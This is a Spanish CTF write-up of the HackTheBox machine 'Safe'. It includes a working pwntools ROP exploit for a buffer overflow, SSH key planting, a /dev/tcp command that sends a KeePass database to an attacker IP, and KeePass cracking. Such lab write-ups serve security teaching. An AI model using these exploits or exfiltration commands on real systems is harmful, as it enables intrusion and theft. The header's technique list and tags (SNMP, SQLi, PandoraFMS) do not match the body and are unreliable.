---
title: Safe | Linux
published: 2025-08-14
image: "./logo.png"
tags: [Easy, Linux, SNMP, Information Leakage, Port Forwarding, SQLi, RCE, CVE-2019-20224, PandoraFMS, PATH Hijacking, OSCP, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- SNMP Fast Enumeration
- Information Leakage
- Local Port Forwarding
- SQL Injection - Admin Session Hijacking
- PandoraFMS v7.0NG Authenticated Remote Code Execution [CVE-2019-20224]
- Abusing Custom Binary - PATH Hijacking [Privilege Escalation]

### Preparación

- OSCP
- eWPT

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.147 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.147`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p22,80,1337 10.10.10.147 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.147`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.25 (Debian)
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     12:00:50 up 4 min, 0 users, load average: 0.08, 0.10, 0.05
|   DNSVersionBindReqTCP: 
|     12:00:45 up 4 min, 0 users, load average: 0.09, 0.10, 0.05
|   GenericLines: 
|     12:00:34 up 3 min, 0 users, load average: 0.02, 0.09, 0.05
|     What do you want me to echo back?
|   GetRequest: 
|     12:00:40 up 4 min, 0 users, load average: 0.10, 0.11, 0.05
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     12:00:40 up 4 min, 0 users, load average: 0.10, 0.11, 0.05
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     12:00:56 up 4 min, 0 users, load average: 0.08, 0.10, 0.05
|     What do you want me to echo back? HELP
|   NULL: 
|     12:00:34 up 3 min, 0 users, load average: 0.02, 0.09, 0.05
|   RPCCheck: 
|     12:00:40 up 4 min, 0 users, load average: 0.10, 0.11, 0.05
|   RTSPRequest: 
|     12:00:40 up 4 min, 0 users, load average: 0.10, 0.11, 0.05
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     12:00:56 up 4 min, 0 users, load average: 0.08, 0.10, 0.05
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.95%I=7%D=8/13%Time=689CB6A8%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3E,"\x2012:00:34\x20up\x203\x20min,\x20\x200\x20users,\x20\x20load\x
SF:20average:\x200\.02,\x200\.09,\x200\.05\n")%r(GenericLines,63,"\x2012:0
SF:0:34\x20up\x203\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200
SF:\.02,\x200\.09,\x200\.05\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ec
SF:ho\x20back\?\x20\r\n")%r(GetRequest,71,"\x2012:00:40\x20up\x204\x20min,
SF:\x20\x200\x20users,\x20\x20load\x20average:\x200\.10,\x200\.11,\x200\.0
SF:5\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20
SF:/\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2012:00:40\x20up\x204\x20min,\
SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.10,\x200\.11,\x200\.05
SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\
SF:x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2012:00:40\x20up\x204\x20mi
SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.10,\x200\.11,\x200\
SF:.05\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIO
SF:NS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2012:00:40\x20up\x204\x20mi
SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.10,\x200\.11,\x200\
SF:.05\n")%r(DNSVersionBindReqTCP,3E,"\x2012:00:45\x20up\x204\x20min,\x20\
SF:x200\x20users,\x20\x20load\x20average:\x200\.09,\x200\.10,\x200\.05\n")
SF:%r(DNSStatusRequestTCP,3E,"\x2012:00:50\x20up\x204\x20min,\x20\x200\x20
SF:users,\x20\x20load\x20average:\x200\.08,\x200\.10,\x200\.05\n")%r(Help,
SF:67,"\x2012:00:56\x20up\x204\x20min,\x20\x200\x20users,\x20\x20load\x20a
SF:verage:\x200\.08,\x200\.10,\x200\.05\n\nWhat\x20do\x20you\x20want\x20me
SF:\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2012:00:56
SF:\x20up\x204\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.08
SF:,\x200\.10,\x200\.05\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x
SF:20back\?\x20\x16\x03\n")%r(TerminalServerCookie,63,"\x2012:00:56\x20up\
SF:x204\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.08,\x200\
SF:.10,\x200\.05\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\
SF:?\x20\x03\n")%r(TLSSessionReq,64,"\x2012:00:56\x20up\x204\x20min,\x20\x
SF:200\x20users,\x20\x20load\x20average:\x200\.08,\x200\.10,\x200\.05\n\nW
SF:hat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Usamos el comando **whatweb** para ver más información:

```bash wrap=false
whatweb http://10.10.10.147
http://10.10.10.147 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.147], Title[Apache2 Debian Default Page: It works]
```

### Apache Default Page (80)

Si entramos a la web podmos ver la por defecto de apache:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Ft9W94jEosj7jcWDHfuiL%2Fimage.png?alt=media&#x26;token=1d2d95f0-1cd7-47eb-ab11-fcda3c27be7b" alt=""><figcaption></figcaption></figure>

Haciendo **fuzzing** no encontramos nada, pero vemos un extraño comentario en el código fuente de la página:

<pre><code><strong>&#x3C;!-- 'myapp' can be downloaded to analyze from here its running on port 1337 -->
</strong></code></pre>

Si accedemos a la ruta **/myapp**, nos descargará el binario que está corriendo por el puerto **1337**, si le damos permisos y lo ejecutamos lo podemos comprobar:&#x20;

```bash wrap=false
❯ ./myapp
 18:21:01 up  2:38,  1 user,  load average: 1,36, 2,72, 2,45

What do you want me to echo back? hola
hola
```

### Ghidra

Usaremos la herramienta **Ghidra** para poder analizar mejor este binario:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FqSnORDg14vo0em88TmX1%2Fimage.png?alt=media&#x26;token=596c2aad-a20a-4b8f-ae0a-0ce4e76e872c" alt=""><figcaption></figcaption></figure>

Gracias a esta herramienta, podremos ver el flujo principal del programa:&#x20;

```c wrap=false
undefined8 main(void)

{
  char local_78 [112];
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(local_78);
  puts(local_78);
  return 0;
}
```

Esto parece ser que es vulnerable a **Buffer Overflow**.

### GDB (Con GEF)

**GDB** es un depurador que permite ejecutar programas paso a paso, inspeccionar variables, memoria y registros, y detectar errores como desbordamientos o fugas. **GEF** es un plugin que potencia GDB con comandos más amigables, visualización de stacks y memoria, y herramientas útiles para análisis de binarios y explotación de vulnerabilidades. Juntos, facilitan entender y manipular programas a nivel interno de forma rápida y visual.

Una vez explicado esto, procederemos a abrir el programa con gdb para analizarlo detalladamente. Primero nos crearemos un patron para saber el **offset** que tenemos:

```bash wrap=false
gef➤  pattern create 150
[+] Generating a pattern of 150 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
[+] Saved as '$_gef0'
```

El programa nos calcula solo este valor de la siguiente manera:

```bash wrap=false
gef➤  patter offset $rsp
[+] Searching for '7061616161616161'/'6161616161616170' with period=8
[+] Found at offset 120 (little-endian search) likely
```

El **rsp** es el _stack pointer_ que apunta al tope de la pila. Vamos a comprobar si esto es verdad con el siguiente patrón:

```bash wrap=false
❯ python3 -c 'print("A"*120 + "B"*8 + "C"*8)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
```

El comando `checksec` permite revisar las protecciones de seguridad aplicadas al binario. Los resultados para `myapp` son:

<table><thead><tr><th width="111.727294921875">Protección</th><th width="88.9090576171875">Estado</th><th>Descripción</th></tr></thead><tbody><tr><td><strong>Canary</strong></td><td><mark style="color:red;">✘</mark></td><td>No tiene <em>stack canaries</em>, por lo que <strong>no detecta sobrescrituras en la pila</strong>. Facilita un <strong>buffer overflow</strong>.</td></tr><tr><td><strong>NX</strong></td><td><mark style="color:green;">✓</mark></td><td>La memoria <strong>no ejecutable</strong> está activada. Evita ejecutar código inyectado en stack o heap.</td></tr><tr><td><strong>PIE</strong></td><td><mark style="color:red;">✘</mark></td><td>El binario <strong>no es Position Independent</strong>. Las direcciones de funciones y variables son <strong>predecibles</strong>, facilitando exploits.</td></tr><tr><td><strong>Fortify</strong></td><td><mark style="color:red;">✘</mark></td><td>No utiliza <em>Fortify Source</em>, lo que significa que funciones de string peligrosas (<code>strcpy</code>, <code>sprintf</code>) <strong>no tienen protección adicional</strong>.</td></tr><tr><td><strong>RelRO</strong></td><td><mark style="color:yellow;">Partial</mark></td><td>Protección <em>Relocation Read-Only</em> parcialmente activada. Algunas secciones son de solo lectura, pero otras pueden ser modificadas (<strong>GOT overwrite posible</strong>).</td></tr></tbody></table>

Pensando como vulnerar esto, recordamos lo siguiente:&#x20;

```c
undefined8 main(void)

{
  char local_78 [112];
  
  /* 
  system("/bin/sh") -> Comando que nos interesa ejecutar
  rdi, rsi, rdx, rcx, r8, r9 (Convenio de llamadas)
  rdi -> /usr/bin/uptime 
  */
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(local_78);
  puts(local_78);
  return 0;
}

```

Según el convenio de llamadas, la función system acude al valor `"/usr/bin/uptime"` que debería estar almacenado en **RDI**. Vamos a comprobarlo con **gdb**:

```bash
gef➤  b *main
Breakpoint 1 at 0x40115f
```

```c wrap=false
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40115c <test+000a>      nop    
     0x40115d <test+000b>      pop    rbp
     0x40115e <test+000c>      ret    
●→   0x40115f <main+0000>      push   rbp
     0x401160 <main+0001>      mov    rbp, rsp
     0x401163 <main+0004>      sub    rsp, 0x70
     0x401167 <main+0008>      lea    rdi, [rip+0xe9a]        # 0x402008
     0x40116e <main+000f>      call   0x401040 <system@plt>
     0x401173 <main+0014>      lea    rdi, [rip+0xe9e]        # 0x402018
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
```

Avanzamos hasta **RDI** con el comando `si` .

```c wrap=false
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401160 <main+0001>      mov    rbp, rsp
     0x401163 <main+0004>      sub    rsp, 0x70
     0x401167 <main+0008>      lea    rdi, [rip+0xe9a]        # 0x402008
 →   0x40116e <main+000f>      call   0x401040 <system@plt>
   ↳    0x401040 <system@plt+0000> jmp    QWORD PTR [rip+0x2fda]        # 0x404020 <system@got.plt>
        0x401046 <system@plt+0006> push   0x1
        0x40104b <system@plt+000b> jmp    0x401020
        0x401050 <printf@plt+0000> jmp    QWORD PTR [rip+0x2fd2]        # 0x404028 <printf@got.plt>
        0x401056 <printf@plt+0006> push   0x2
        0x40105b <printf@plt+000b> jmp    0x401020
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x0000000000402008 → "/usr/bin/uptime",
   $rsi = 0x00007fffffffdce8 → 0x00007fffffffe08e → "/home/zelpro/HTB/Safe/content/myapp"
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
```

```bash
gef➤  x/s $rdi
0x402008:	"/usr/bin/uptime"
```

Perfecto, esto es correcto. Investigando, hay una función llamada **test** la cual modifica **RSI** por **RBP** al cual si tenemos acceso.

```c wrap=false
************************************************
*                   FUNCTION                   *
************************************************

                      undefined test()
          undefined     <UNASSIGNE <RETURN>
                      test                                  XREF[3]:  Entry Point(*), 00402060, 
                                                                      00402108(*)  
     00401152 55          PUSH     RBP
     00401153 48 89 e5    MOV      RBP,RSP
                      RDI -> /bin/sh
     00401156 48 89 e7    MOV      RDI,RSP
                      R13 -> system()
     00401159 41 ff e5    JMP      R13
     0040115c 90          ??       90h
     0040115d 5d          ??       5Dh    ]
     0040115e c3          ??       C3h

```

## Explotación

Como vemos podríamos hacer que **RDI** valiese `/bin/sh` y **R13** `system()` para que lo ejecute. Vamos a crearnos un script en **python** para automatizarlo:

```python title="exploit.py (Creado por S4vitar)" wrap=false
#!/usr/bin/python3 

from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

# p = gdb.debug("./myapp", "b *main") Debug en local
p = remote("10.10.10.147", 1337)
# p.recvuntil("What do you want me to echo back?") Debug en local

junk = b"A"*112 # 120 - 8 -> 8 es la longitud de bin_sh                                                                                                    exploit.py                                                                                                                    
bin_sh = b"/bin/sh\x00"

# Buscamos un gadget que modifique R13
# ./Ropper.py -f ../myapp --search "pop r13"
# 0x0000000000401206: pop r13; pop r14; pop r15; ret; 

pop_r13 = p64(0x401206)
null = p64(0x0)

# Buscamos dónde se encunetra la función system
# objdump -D ./myapp | grep system
# 0000000000401040 <system@plt>:
#   40116e:     e8 cd fe ff ff          call   401040 <system@plt>

system_plt = p64(0x401040)

# ❯ objdump -D ./myapp | grep test
#  40100b:      48 85 c0                test   %rax,%rax
#  4010c2:      48 85 c0                test   %rax,%rax
#  401104:      48 85 c0                test   %rax,%rax
# 0000000000401152 <test>:

test = p64(0x401152)

payload = junk + bin_sh + pop_r13 + system_plt + null + null + test

p.sendline(payload)
p.interactive()
```

```bash wrap=false
❯ python3 exploit.py
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
 11:39:24 up  2:05,  0 users,  load average: 0.00, 0.00, 0.00
$ whoami
user
$ pwd
/
$ hostname -I
10.10.10.147 dead:beef::250:56ff:fe94:942c
$ cat user.txt
349f5a4461f0619...
```

Para conectarnos de manera más cómoda lo haremos por **SSH**:

```bash wrap=false title="Máquina atacante"
❯ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/zelpro/.ssh/id_ed25519):    
Created directory '/home/zelpro/.ssh'.
Enter passphrase for "/home/zelpro/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/zelpro/.ssh/id_ed25519
Your public key has been saved in /home/zelpro/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:wFFaddUAW2YpFRHuBetXOg8wvlMFwWNRmBU65G8dxM8 zelpro@kali
The key's randomart image is:
+--[ED25519 256]--+
|      ..o.. o*^^+|
|     . +   .+*X=.|
|      +     +*o+=|
|       .   . =o+E|
|        S   . Boo|
|             o.= |
|            o   .|
|             .   |
|                 |
+----[SHA256]-----+
```

```bash wrap=false title="Máquina víctima"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMdlq0HygH+TmnlbkEVYyOCxFKavVD10ChBYdedvgijx zelpro@kali" > authorized_keys
```

```bash wrap=false title="Conexión SSH"
❯ ssh user@10.10.10.147
The authenticity of host '10.10.10.147 (10.10.10.147)' can't be established.
ED25519 key fingerprint is SHA256:Hqxg+VODVEXsVQmThoXvZx82QI/LgQDGT59rQLHOaDQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.147' (ED25519) to the list of known hosts.
Linux safe 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec  7 20:30:52 2023 from 10.10.14.23
user@safe:~$                                                                                                                                                                                                                                          
```

## Escalada de privilegios

Vemos un archivo `Keepass` bastante raro en el directorio del usuario:

```bash wrap=false
user@safe:~$ file *
IMG_0545.JPG:     JPEG image data, baseline, precision 8, 3264x2448, frames 3
IMG_0546.JPG:     JPEG image data, baseline, precision 8, 3264x2448, frames 3
IMG_0547.JPG:     JPEG image data, baseline, precision 8, 3264x2448, frames 3
IMG_0548.JPG:     JPEG image data, baseline, precision 8, 3264x2448, frames 3
IMG_0552.JPG:     JPEG image data, baseline, precision 8, 3264x2448, frames 3
IMG_0553.JPG:     JPEG image data, baseline, precision 8, 3264x2448, frames 3
myapp:            ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
MyPasswords.kdbx: Keepass password database 2.x KDBX
user.txt:         ASCII text
```

Para traernos ese archivo, haremos lo siguiente:

```bash title="Máquina atacante"
nc -lvnp 4646 > MyPasswords.kdbx
```

```bash title="Máquina víctima"
cat < MyPasswords.kdbx > /dev/tcp/10.10.14.5/4646
```

Si lo abrimos con la herramienta `keepassxc` veremos que tiene contraseña:

```bash
keepassxc MyPasswords.kdbx
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FBXJZ1dFvyRXMkTSrJ1c9%2Fimage.png?alt=media&#x26;token=faebd4d3-a8a6-4d10-9c1c-4580d5d4cf09" alt=""><figcaption></figcaption></figure>

Usaremos la herramienta `keepass2john` para conseguir un hash:

```bash wrap=false
❯ keepass2john MyPasswords.kdbx
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
```

Y lo crackearemos con:

```bash
john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Por desgracia no conseguimos crackearlo, para seguir investigando vamos a descargar las imágenes para ver que son de la siguiente manera:

```bash title="Máquina víctima "
busybox httpd -f -p 4646
```

```bash title="Máquina atacante" wtap=false
for file in IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG; do wget http://10.10.10.147:4646/$file; done
```

Podemos verlas desde terminal con:&#x20;

```bash
kitty +kitten icat <IMG>
```

Podemos ver que son fotografías de paisajes pero nada interesante. Es raro que pongan imágenes sin nada, lo que da a pensar que se estén usando como `keyfile`     &#x20;

```bash wrap=false
❯ for file in IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG; do keepass2john -k $file MyPasswords.kdbx; done
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2
```

```bash wrap=false
❯ john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt hashes

Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (MyPasswords)     
```

Efectivamente, vamos a probar a entrar ahora:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F6FgXkY8EHIW8v5zgXME3%2Fimage.png?alt=media&#x26;token=8b55abf6-9794-4c94-977e-a3ee9e46425d" alt=""><figcaption></figcaption></figure>

Con `IMG_0547.JPG` funciona correctamente. Y ya estaría la contraseña se root con `su root`:

```bash
root@safe:~# cat root.txt 
9a1a444a6aaf1dfb6...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/199)

---